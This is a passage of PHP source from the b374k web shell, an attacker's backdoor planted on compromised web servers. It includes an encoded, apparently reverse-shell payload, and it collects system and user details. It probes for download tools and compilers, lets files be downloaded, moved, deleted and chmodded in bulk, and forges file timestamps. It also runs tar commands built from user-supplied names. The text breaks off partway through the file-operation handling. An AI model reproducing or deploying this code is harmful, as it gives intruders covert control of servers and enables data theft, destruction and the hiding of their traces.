$s_rs_php = "7VVNb+M2ED3bgP+DlhUQCVUsyy6wQFxmL+2xwKIt0MMmFWSKsghLIsuhai+a/PcORcnWOk6yaLe9tDBikzOcx/l4fPn2nSrVbPqVVxqj4CaOmcz5fCvltuJzJutYxZvV229211DyqopnU6611KnmSmojmm2wCNezKXCTGlHztBK1MM4mN6moVSWYMGlRtVAG1jqb+ibTW26oD6kGt14frUD5QVWYQkA8EvVGG+czoMlq9dYu9xlt2qqyS35aQkkJBmNa3s/f//gDPRiu6/X7nxJ6dee//+W726t170bbOt6IJobSuxbEBteUdGV6XZnejcdk03BmeH7XkC5tUQRMto0JhkxDSpPwj9l04ivqH+uY+JgG6RYGMUWT280j9q0CfgljeYYBHxb3Pc7RktwfATO26wG7lIq2YUbIJuUHAQaCK8UaU6WF1LursEcWOT1ZuyFMMLKz0+skxEgTJGOzMy0Gk5IgDimOGEQehGcxQyKYXF+uuxUoGM2zOgXJdsgO4Pp3rgNimEKSLebd54bMfRX5SKlGdj8Y0906xPa0ki22DKKVS8lnZ9gZY1zZE0PG6Dayknu8ENoN7gIkedo2Wc2DMFpEqxDLIHvRuGQnxV4LwwOfRX49x46zPRY6J7ekA5zsS1GhV72htMhwjC7Izqyw48E4d65rlubbtM4MKwMSs/zOCz78egf3X4exQD5jsVqHffzEz3OK+368Ll5AmgsdoCsMWTkse78v6Tg7Z33svnt6GS3qcfm+6kq18yLew4P3jP+3Fv2ht8Gu7tZHPA/v4wdbOV6H72D+9PJR56TLskunYJUEfmzMsHUDsics/JPWu8N+DjTTOvsYLOitWxAlFCcR0SSMknPjHo3LC8YeTWmqtGSpVLzBDMoI8XEQQjk/9uwN9lxzkK1mtlacz+hJjKm4qZBvVvNsOD7TaPHKkeT1I8uXj7DB6zhodDuwzz5+Lgvb44cHt3JXhuFojL7O+mbaDvc59Rf3rDreW6HeBRgQocDia8wiq6wnZosmPSHp7MRiQQtEyDs7g4Grw2D7VvkiHNP1E7whrYugg/MpMnsVdPkS6PKzQB/P+Dti9rB0FX66T872Q7c7Kg52PTyH078HJ6NW5AcZLazIOfKWnYDwBv+OYvg31A7+otrBf17t4LLavSBv8L+8XToCr8sbfKa8wReTN3hGNODflTf4J+TtHPQ5efsimvbu9k8=";
$s_favicon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKYSURBVDjLnZPJT1NRFMb5G1wDHV5boNiqdHrvFYolCAtsGSSWKpMFKhYqlDI6oAEKaVJwCIgSphaKtLYWCgSNBgRjMNHoxsSFS3cmJmA0NMTw+R6JKKZl4eJL7sm953fOd3JPHIC4WMpcppG5SGnZc8ZjVVF6QLn975sDgfaZmvg71oRJZIRUYcuAnq/2KWroGfm3QwEn2YpLVPPvOD2oiqj9yq/mGznegl56mx6T7ZbY1M6YAM0CuZkxT0b2Wg6QW/SsApRXDsotR+d6E9Y/h9DuqoCuJq0lKoDxqU1/pITGR27mBU4h+GEcTz5OY+ClA5JbyahYzof/9TBO9B/FcWcqpA4xU3We3GJ87ntnfO5meinMvruNnqcmXA2XoDVcCc0wCYkzBaZpA7ILRJ/2O2B87jA+QT9UeDRe8svZYAG8b/txc6kc9mA+yqayYPQXwvdmBEOrA5B2p0BtFIYOWKCm5RukWwZyXIbA+0F0LpaiKaBHmVsLw4we99ccsM8a8GClF5JOMcQdou8prULrgRmQo7KI0VcE13MrGv06lE5kodhzGvdWu2GdKkTVWC4DcELcJkKyXbCb1EhAVM//M0DVUNqP2qAJd1baUDaZjTMTeXAttsPi0cM0mgvHvA0NkxYk2QRIrieOsDmEmXttH0DfVfSluSToWmpD8bgOroUOWNw6VI7koGfOBuq6EqLLTNU6ojrmP5D1HVsjmrkYezGIrlA9LjKgnrlGXJlpgbCOD0EtD0QNN8I3cZqjAlhJr4rXpB1iNLhrYffUQWoT7yUKzbxqJlHLq0jc5JYmgHMunogKYJVqF7mTrPyfgktMRTMX/CrOq1gLF3fYNrLiX+Bs8MoTwT2fQPwXgBXHGL+TaIjfinb3C7cscRMIcYL6AAAAAElFTkSuQmCC";
$s_arrow = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsSAAALEgHS3X78AAAEYElEQVRYw8VXS0xcVRj+z7kv5tF5MPfOo1AgkFBKoQPuFAyxstKkcWHjGhOjcacxujMxaqtx48b4iDExxiZuXBVdtEURN00qDBMgTUOmnTEMc+/ce4d5c+k957gZEKYCd5DSb3tOzv+d//0hcACO47hgsL07HA5fDIfDkz6ffxQAogDgblypMcZypVIpYRj6DVVVZ0zTSBNCyGFvo4MOMca8LMsjvb19r8uy8iLGOAIA+JA3KaVU1XV9OpVa/VrX9QSl1G6ZgM/ni5w7N/iuooSnMMZBOAIopQVN0767e3fls1KppDoigBCCrq6ukf7+gS9cLtfTh3nJAVi9Xr+dTCbf1LTcAmNsb3ibjXd394wPDQ1fE0UxfgzGAQCQIAid0Whs8uHDrflisZjZl8Dp052jw8PxazzP9cExA2PcHgopE7Va7Y9yuZR7hIDP54uMjj71gySJF+AxAWPcHgwGh3U9f92yrOoOAYwxF4+PvB8IBF9u0e02AFAHlbEDQRA63W43zWbXf2eMMQwA0NHROaoo4VdbeYgxZmUy6SuZTPojxthmK46QZeU1WQ5d2O4x3MDA4Ader3esFePp9IMrS0tLn2iaNieKIvH7A88ghHhHWYmQWxQltL6e/ZULheTe/v7+qwjhU60YX15e/pQQ22KMEsMwbrdKwuVyxQoF82eup6fvcigUesVJ7Bljm+n0g6vbxnc1HKLrrZFACHksy1rhBgfPv9fW1jbk8OePGP/3fIeE7fcHxhyQQBijOhePj3wIAHIrbt//Xmue4HmB586eHfgYAKSj/vz/eAJjLPAA4DlonhSLpe9VVfsxGAyGd8d8Y6OgUkrJdh8JBIIRjPFOY1NV7adAINgRCATeOKC8vejSpZfs5pa8+0MAUGSM7RmnlmXlZ2d/m7AsKw8AIEmSMjHx3KwkSUpTovEA4D8gwQkPAJXGpf2mZQAh1JzBpOlXGCHUjhCSW+zOFWzbdg6eEGzbXseVSnnxSRGoVMqLWNfNm42BctIghmHcxJqWu0UpOfEwUErVfF6bwYWCmdZ1Y/qkCei6Pm0YRhoTQkgqtfoVpdR0vGMhwKIoKZIkRSRJioiipCDkfJRTSo1UavVLQgjhG2wW83nt20gk+o6TnUAQxNDY2PgMY4w2yhILghByat80jW8Mw0jubESMMVaplJORSHRcEIQzDiYZ4jjOw/O8l+d5L8dxHtTcLPbB5mb9z0Ri4a16vV7ZsxNallWtVqt/xWKxixjj0GNJe0LuLSzMTxmGfv8/t+JarapubW3Ny7Ly7HGTsG373srK8lQ2u3Zn37UcAKBYLP5tWZtzPp9vUBDEM8egDWi1Wp1bXExMZbNrdw4UJrtIqLmcel0UJdvj8Z7HGLmPVuvEWFtb+zyRWHh7Y6Nw/yjilJNlpSFO5RcwxjGH4nRd1/VfdolTciR13CTPu8Lh8POyLE96vafiPM9HAWB7kS3btp2rVMpJ0zRvqKp6yzSNjBN5/g/C3ULDeIdIrQAAAABJRU5ErkJggg==";
$s_dark_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=";
$s_bright_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAACXBIWXMAAAsSAAALEgHS3X78AAABP0lEQVQ4je2TsUoDQRCGv5m93RRBLBIQO/NOFgHJa4iiZUDwNUSx8J0s5SCFkkJy3M5aJBfwLrm7oI3gD8sWO9/+O+z8kud5AC6BC+CUbr0Bj8B9BlzHGK+KoghmpiklUkp7SVU9CiHceO9dBsyKohjEGMXMMLNWWETUzAbe+1kGjM1MzIyyLFvBSmYmwDgDSCltHc2sE1bV9V7BfRwblxxM/MM/gxeqmkSkNyQiCVgo8BBCWDnnkoigqq3LOZeGw+EKeMqAO+998N6fAyc9jHPgBZhXPX8C3XO5lm3q+f1Ixhh3QUCPSNbdReRb2g6KZP2yRiRjjK29vj7fNlupO/QFG/Cu4n0grL+ql9tkOm93FhF2PfxsA9bPtrCqIiJIzWUynVNFph4dyfP8fblcHpdlSTUkXVJVRqPRxx+N5BfD5OFvXtL9jAAAAABJRU5ErkJggg==";
$s_style = "rVbLjpswFP0VqqhSH4AgSTMzoH5Cl11VXRgwwRqwkTGdZBD/Xj/BgJNppbE3Drm+z3PP9ZehJJgFJWhQfU1+Zj1mvfeDYOJ3kKIyHTNSXIcM5M9nSnpcJLtIrlRe69ArTOJ9e0lzUhOa7Eq51J8vEJ0rlhy58FjRISO0gDSJ24vXkRoV3m4vVzqCwdw+y0PK4IUFBcwJBQwRnGCCIRdLKvIH0mFpamwpHFpQFAifk8h75L6MJaHNUKCurcE1QbhG4joDWQ09VvntkPe04yoKWIK+Zum4awDCiyBjudKgIa+BcjygoEB9l8QRt+D49IIKVvFj9DE13vC8KH92FQRcfpBxgRqdcVLDkqUNoGeEk2i6EU2yHiuGe39X8TBXYC8c4PnOnhELGAW4ExlIKGGAwU9BfAgPDwU8f1bx3BO4b9IDfggvLU8/rFHHVD08sK7IroG4d6XTaPdEZo4yMxR2vATDfyR6iyMDG1HnoFKoi09CdOuCdhXINTukgGOCPprChSJ0hEui0RuIsrlMa0UnS4mIUSiWnihNLKs7j9FB+7gXKeAZZCgHtcZFg4qi5mgNz+DKs23jXZuye+tB9JYUepfq15AxHmTXglxHwLWLYjZoUc79k9jpv3StQ+WKOd7Fcwd+jhv4iC8bgM+1VoFqkrHDPZzEvu3oW37O/48hwm3PXv2wpaRpmR+yCwMUAle3aKBHJoqMMEYaG32HJ7HvU7EFR25emR22GDJ+WDSmUXp4iORV5XnWs2Flb+H6k9hrZNyk/qn/JBkYbhkcXCrKFM0inHTcQ2IS4Px5M2/aus0Xrl5kpE1Xk2VWX22SuOgQZcHcPk0gm+5TB9DiR7E/oKYllAHMJ1PYwYbP5CuaxpkM00XToeApT045O4HLFjjdJVCtVuXaqH7U1RfKK5/HvfXYwUlK/u0aaMlqbw/HHGJOGjauv61xlou9ZpfTpuWtL1sXXGEv5kAczbFPUy6XS9Augi8lcmb7ZrjWwFGQN0r+JVeOxNvotQfPUnnOE8lTOj2T4ngmvWtGLu8zfm+n8bg0J6p9M9ajXGsG2QLeMx2JCUPlApTmktahH6xbYKxRq40cFvDXvnv72diMBa16DEtC2PKBR4VaG8IieY5pqDWtCGP9bPBV5vjJRtsoOfkXu7bwe17B/JmL/A7zrgvML++rV4MM1vKjPBkQqKeMfDmaJ5NosuWrOchqkj8vH1bLVgwobCFgnJb0yf6vJR2S3MyrdeOho5/iLUGy5d+OKJEHWDgic1sOpMeqi33NNrE5UP9Ng0vmHf8C";
$s_mime_types = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
// http://www.kryogenix.org/code/browser/sorttable/ - SortTable (c) Stuart Langridge
$s_sortable_js = "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";
// https://github.com/ded/domready - domready (c) Dustin Diaz
$s_domready_js = "VVJNb9swDP0riQ6GBAjOetglheBD19uGHrpbkAKaRFcqZMmQ6HSB5/8+2mm+Lpb5yPf4SGndDtGgT5GDRDHisYfUrrpkhwBrxYZoofURLGtOWA1/+5SxKORi+1V9KlGKnbVYVd2lat1ZSqc/H2CQNSeQIwk4X3awn8UmzmzqMmh7ZPJqSozn/1U/R049PH46H4CDwro43xJXAPEPOq9Q7fYyyqzWD9Irm8zQQURZlK/PwXOABUuqEPZqcgpBDor9ePn1lCJS6mfSlgaWWjFt7fNhhnyhDGRyRmPExWVBjWCcju/AZFBsAV9nkEmjUrN5C4vQvzez2V4Cs5FOmRqhIPe7sBePGXDIceV3el9V85cPMqrLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNFDLKxlIbJLfv4kpzi9BTNvbF+AauHYFMU3iPw==";

// appearance
$s_theme = "dark"; // default is dark
if (isset($_COOKIE['theme'])) {
    $s_theme = $_COOKIE['theme'];
}
if (isset($_GP['x']) && ($_GP['x'] == 'switch')) {
    if (isset($_COOKIE['theme'])) {
        $s_theme = $_COOKIE['theme'];
    }
    if ($s_theme == "bright") {
        $s_theme = "dark";
    } else {
        $s_theme = "bright";
    }
    setcookie("theme", $s_theme, time() + $s_login_time);
}
$s_highlight_dark = array("4C9CAF", "888888", "87DF45", "EEEEEE", "FF8000");
$s_highlight_bright = array("B36350", "777777", "7820BA", "111111", "007FFF");

global $s_self, $s_win, $s_posix;

$s_self = "?";
$s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$s_cek2 = substr(basename(__FILE__), 0, strlen($s_cek1));

if (isset($_COOKIE['b374k_included'])) {
    if (strcmp($s_cek1, $s_cek2) != 0) {
        $s_self = $_COOKIE['s_self'];
    } else {
        $s_self = "?";
        setcookie("b374k_included", "0", time() - $s_login_time);
        setcookie("s_self", $s_self, time() + $s_login_time);
    }
} else {
    if (strcmp($s_cek1, $s_cek2) != 0) {
        if (!isset($_COOKIE['s_home'])) {
            $s_home = "?" . $_SERVER["QUERY_STRING"] . "&";
            setcookie("s_home", $s_home, time() + $s_login_time);
        }
        if (isset($s_home)) {
            $s_self = $s_home;
        } elseif (isset($_COOKIE['s_home'])) {
            $s_self = $_COOKIE['s_home'];
        }
        setcookie("b374k_included", "1", time() + $s_login_time);
        setcookie("s_self", $s_self, time() + $s_login_time);
    } else {
        $s_self = "?";
        setcookie("b374k_included", "0", time() - $s_login_time);
        setcookie("s_self", $s_self, time() + $s_login_time);
    }
}
$s_cwd = "";

if (isset($_GP['|'])) {
    showcode($s_css);
} elseif (isset($_GP['!'])) {
    showcode($s_js);
}

if ($s_auth) {
    // server software
    $s_software = getenv("SERVER_SOFTWARE");
    // uname -a
    $s_system = php_uname();
    // check os
    $s_win = (strtolower(substr($s_system, 0, 3)) == "win") ? true : false;
    // check for posix
    $s_posix = (function_exists("posix_getpwuid")) ? true : false;
    // change working directory
    if (isset($_GP['cd'])) {
        $s_dd = $_GP['cd'];
        if (@is_dir($s_dd)) {
            $s_cwd = cp($s_dd);
            chdir($s_cwd);
            setcookie("cwd", $s_cwd, time() + $s_login_time);
        } else {
            $s_cwd = isset($_COOKIE['cwd']) ? cp($_COOKIE['cwd']) : cp(getcwd());
        };
    } else {
        if (isset($_COOKIE['cwd'])) {
            $s_dd = ss($_COOKIE['cwd']);
            if (@is_dir($s_dd)) {
                $s_cwd = cp($s_dd);
                chdir($s_cwd);
            }
        } else {
            $s_cwd = cp(getcwd());
        }
    }

    if (!$s_win && $s_posix) {
        $s_userarr = posix_getpwuid(posix_geteuid());
        if (isset($s_userarr['name'])) {
            $s_user = $s_userarr['name'];
        } else {
            $s_user = "$";
        }
    } else {
        $s_user = get_current_user();
    }

    // prompt style
    $s_prompt = $s_user . " &gt;";
    // server ip
    $s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
    // your ip ;-)
    $s_my_ip  = $_SERVER['REMOTE_ADDR'];
    $s_result = "";

    global $s_python, $s_perl, $s_ruby, $s_node, $s_nodejs, $s_gcc, $s_java, $s_javac, $s_tar, $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

    $s_access = array(
        "s_python",
        "s_perl",
        "s_ruby",
        "s_node",
        "s_nodejs",
        "s_gcc",
        "s_java",
        "s_javac",
        "s_tar",
        "s_wget",
        "s_lwpdownload",
        "s_lynx",
        "s_curl"
    );
    foreach ($s_access as $s) {
        if (isset($_COOKIE[$s])) {
            $$s = $_COOKIE[$s];
        } else {
            if (!isset($_COOKIE['b374k'])) {
                $t = explode("_", $s);
                $t = check_access($t[1]);
                if ($t !== false) {
                    $$s = $t;
                    setcookie($s, $$s, time() + $s_login_time);
                }
            }
        }
    }

    // download file specified by ?dl=<file>
    if (isset($_GP['dl']) && ($_GP['dl'] != "")) {
        ob_end_clean();
        $f  = $_GP['dl'];
        $fc = fgc($f);
        header("Content-type: application/octet-stream");
        header("Content-length: " . strlen($fc));
        header("Content-disposition: attachment; filename=\"" . basename($f) . "\";");
        echo $fc;
        die();
    }
    // massact
    if (isset($_GP['z'])) {
        $s_massact = isset($_COOKIE['massact']) ? $_COOKIE['massact'] : "";
        $s_buffer  = isset($_COOKIE['buffer']) ? rtrim(ss($_COOKIE['buffer']), "|") : "";
        $s_lists   = explode("|", $s_buffer);

        $s_counter = 0;
        if (!empty($s_buffer)) {
            if ($_GP['z'] == 'moveok') {
                foreach ($s_lists as $s_l) {
                    if (rename($s_l, $s_cwd . basename($s_l))) {
                        $s_counter ++;
                    }
                }
                if ($s_counter > 0) {
                    $s_result .= notif($s_counter . " items moved");
                } else {
                    $s_result .= notif("No items moved");
                }
            } elseif ($_GP['z'] == 'copyok') {
                foreach ($s_lists as $s_l) {
                    if (@is_dir($s_l)) {
                        copys($s_l, $s_cwd . basename($s_l));
                        if (file_exists($s_cwd . basename($s_l))) {
                            $s_counter ++;
                        }
                    } elseif (@is_file($s_l)) {
                        copy($s_l, $s_cwd . basename($s_l));
                        if (file_exists($s_cwd . basename($s_l))) {
                            $s_counter ++;
                        }
                    }
                }
                if ($s_counter > 0) {
                    $s_result .= notif($s_counter . " items copied");
                } else {
                    $s_result .= notif("No items copied");
                }
            } elseif ($_GP['z'] == 'delok') {
                foreach ($s_lists as $s_l) {
                    if (@is_file($s_l)) {
                        if (unlink($s_l)) {
                            $s_counter ++;
                        }
                    } elseif (@is_dir($s_l)) {
                        rmdirs($s_l);
                        if (!file_exists($s_l)) {
                            $s_counter ++;
                        }
                    }
                }
                if ($s_counter > 0) {
                    $s_result .= notif($s_counter . " items deleted");
                } else {
                    $s_result .= notif("No items deleted");
                }
            } elseif (isset($_GP['chmodok'])) {
                $s_mod = octdec($_GP['chmodok']);
                foreach ($s_lists as $s_l) {
                    if (chmod($s_l, $s_mod)) {
                        $s_counter ++;
                    }
                }
                if ($s_counter > 0) {
                    $s_result .= notif($s_counter . " items changed mode to " . decoct($s_mod));
                } else {
                    $s_result .= notif("No items modified");
                }
            } elseif (isset($_GP['touchok'])) {
                $s_datenew = strtotime($_GP['touchok']);
                foreach ($s_lists as $s_l) {
                    if (touch($s_l, $s_datenew)) {
                        $s_counter ++;
                    }
                }
                if ($s_counter > 0) {
                    $s_result .= notif($s_counter . " items changed access and modification time to " . @date("d-M-Y H:i:s",
                            $s_datenew));
                } else {
                    $s_result .= notif("No items modified");
                }
            } elseif (isset($_GP['compresszipok'])) {
                $s_file = $_GP['compresszipok'];
                if (zip($s_lists, $s_file)) {
                    $s_result .= notif("Archive created : " . hss($s_file));
                } else {
                    $s_result .= notif("Error creating archive file");
                }
            } elseif (isset($_GP['compresstarok'])) {
                $s_lists_ = array();
                $s_file   = $_GP['compresstarok'];
                $s_file   = basename($s_file);

                $s_lists__ = array_map("basename", $s_lists);
                $s_lists_  = array_map("pf", $s_lists__);
                exe("tar cf \"" . $s_file . "\" " . implode(" ", $s_lists_));

                if (@is_file($s_file)) {
                    $s_result .= notif("Archive created : " . hss($s_file));
                } else {
                    $s_result .= notif("Error creating archive file");
                }
            } elseif (isset($_GP['compresstargzok'])) {
                $s_lists_ = array();
                $s_file   = $_GP['compresstargzok'];
                $s_file   = basename($s_file);

                $s_lists__ = array_map("basename", $s_lists);
                $s_lists_  = array_map("pf", $s_lists__);
                exe("tar czf \"" . $s_file . "\" " . implode(" ", $s_lists_));

                if (@is_file($s_file)) {
                    $s_result .= notif("Archive created : " . hss($s_file));
                } else {
                    $s_result .= notif("Error creating archive file");
                }
            } elseif (isset($_GP['extractzipok'])) {
                $s_file = $_GP['extractzipok'];
                $zip    = new ZipArchive();
                foreach ($s_lists as $f) {
                    $s_target = $s_file . basename($f, ".zip");
                    if ($zip->open($f)) {
                        if (!@is_dir($s_target)) {
                            @mkdir($s_target);
                        }
                        if ($zip->extractTo($s_target)) {
                            $s_result .= notif("Files extracted to " . hss($s_target));
                        } else {
                            $s_result .= notif("Error extrating archive file");
                        }
                        $zip->close();
                    } else {
                        $s_result .= notif("Error opening archive file");
                    }
                }
            } elseif (isset($_GP['extracttarok'])) {
                $s_file = $_GP['extracttarok'];
                foreach ($s_lists as $f) {
                    $s_target = "";
                    $s_target = basename($f, ".tar");
                    if (!@is_dir($s_target)) {
                        @mkdir($s_target);
                    }
                    exe("tar xf \"" . basename($f) . "\" -C \"" . $s_target . "\"");
                }
            } elseif (isset($_GP['extracttargzok'])) {
                $s_file = $_GP['extracttargzok'];
                foreach ($s_lists as $f) {
                    $s_target = "";
                    if (strpos(strtolower($f), ".tar.gz") !== false) {
                        $s_target = basename($f, ".tar.gz");
                    } elseif (strpos(strtolower($f), ".tgz") !== false) {
                        $s_target = basename($f, ".tgz");
                    }
                    if (!@is_dir($s_target)) {
                        @mkdir($s_target);
                    }
                    exe("tar xzf \"" . basename($f) . "\" -C \"" . $s_target . "\"");
                }
            }
        }
        setcookie("buffer", "", time() - $s_login_time);
        setcookie("massact", "", time() - $s_login_time);
    }
    if (isset($_GP['y'])) {
        $s_massact = isset($_COOKIE['massact']) ? $_COOKIE['massact'] : "";
        $s_buffer  = isset($_COOKIE['buffer']) ? rtrim(ss($_COOKIE['buffer']), "|") : "";
        $s_lists   = explode("|", $s_buffer);

        if (!empty($s_buffer)) {
            if ($_GP['y'] == 'delete') {
                $s_result .= notif("Delete ? <a href='" . $s_self . "z=delok" . "'>Yes</a> | <a href='" . $s_self . "'>No</a>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'paste' && $s_massact == 'cut') {
                $s_result .= notif("Move here ? <a href='" . $s_self . "z=moveok" . "'>Yes</a> | <a href='" . $s_self . "'>No</a>");
                foreach ($s_lists as $s_l) {
                    $s_result .= notif($s_l);
                }
            } elseif ($_GP['y'] == 'paste' && $s_massact == 'copy') {
